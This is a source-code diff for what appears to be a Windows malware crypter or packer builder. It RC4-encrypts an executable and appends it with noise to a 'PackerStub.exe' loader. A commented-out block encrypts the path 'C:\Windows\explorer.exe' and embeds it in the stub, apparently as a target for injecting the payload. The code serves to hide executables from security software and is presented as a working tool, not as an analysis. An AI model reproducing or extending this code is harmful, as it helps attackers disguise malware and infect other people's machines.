@@ -41,8 +41,27 @@ BYTE* GenerateKey()
 	}
 	else
 	{
-		//DbgPrint("[-] Failed to get context");
-		return nullptr;
+		if (GetLastError() == NTE_BAD_KEYSET)
+		{
+			// No default container was found. Attempt to create it.
+			if (CryptAcquireContext(
+				&hCryptProv,
+				NULL,
+				NULL,
+				PROV_RSA_FULL,
+				CRYPT_NEWKEYSET))
+			{
+				//DbgPrint("[+] CryptAcquireContext succeeded");
+			}
+			else
+			{
+				//DbgPrint("[-] Could not create the default key container");
+			}
+		}
+		else
+		{
+			//DbgPrint("[-] A general error running CryptAcquireContext");
+		}
 	}
 
 	if (CryptGenRandom(		// Generate a random KEY_LEN key
@@ -164,6 +183,16 @@ bool WritePE(std::vector<BYTE> bin, const char* filename)
 	}
 }
 
+bool RC4BVector(std::vector<BYTE>& pvBuf, std::vector<BYTE> pvKey)
+{
+	CRC4* rc4 = nullptr;
+	rc4 = new CRC4{};
+	rc4->Initialize(&pvKey.front(), KEY_LEN);
+	rc4->RC4(&pvBuf.front(), pvBuf.size());
+	delete rc4;
+	return true;
+}
+
 int main(int argc, char* argv[])
 {
 	if (argc < 3)
@@ -196,6 +225,7 @@ int main(int argc, char* argv[])
 	}
 	std::cout << "[Bin Encryption] Size: " << bin.size() << std::endl;
 
+	std::vector<BYTE> pvKey(bin.end() - KEY_LEN, bin.end());
 
 	std::vector<BYTE> stub = OpenPE("PackerStub.exe");
 	if (stub.size() < 1)
@@ -225,7 +255,35 @@ int main(int argc, char* argv[])
 		return EXIT_FAILURE;
 	}
 	std::cout << "[Stub+Noise] Size: " << stub.size() << std::endl;
+	//// ================================================================================
+	//char* cpPath = "C:\\Windows\\explorer.exe";
+	//std::vector<BYTE> pvPath;
+	//size_t spPath = strlen(cpPath);
+	//pvPath.insert(pvPath.end(), cpPath, cpPath + spPath);
+	//RC4BVector(pvPath, pvKey);
+	//std::cout << pvPath.size() << " : " << (int)spPath << " : " << n_cpPath << std::endl;
+	//stub.insert(stub.end(), pvPath.begin(), pvPath.end());
+	//RC4BVector(pvPath, pvKey);
+	//char* n_cpPath;
+	//n_cpPath = new char[pvPath.size()];
+	//std::copy(pvPath.begin(), pvPath.end(), n_cpPath);
+	////
+	//size_t stPathSize = pvPath.size();
+	//std::vector<BYTE> vbPathSize;
+	//vbPathSize.reserve(sizeof(stPathSize));
+	//vbPathSize.assign(reinterpret_cast<BYTE*>(&stPathSize), reinterpret_cast<BYTE*>(&stPathSize) + sizeof(stPathSize));
+	//stub.insert(stub.end(), vbPathSize.begin(), vbPathSize.end());
+	////
+	//std::vector<BYTE> n_vbPathSize(stub.end() - sizeof(size_t), stub.end());
+	//stub.erase(stub.end() - sizeof(size_t), stub.end());
+	//size_t n_stPathSize = *reinterpret_cast<size_t*>(&n_vbPathSize.front());
+	//std::vector<BYTE> n_Path(stub.end() - n_stPathSize, stub.end());
+	//stub.erase(stub.end() - n_stPathSize, stub.end());
+	////
+	//RC4BVector(n_Path, pvKey);
+	//std::cout << A2T((char*)&n_Path.front()) << std::endl;
 
+	//// ================================================================================
 	stub.insert(stub.end(), bin.begin(), bin.end());
 	if (stub.size() < 1)
 	{
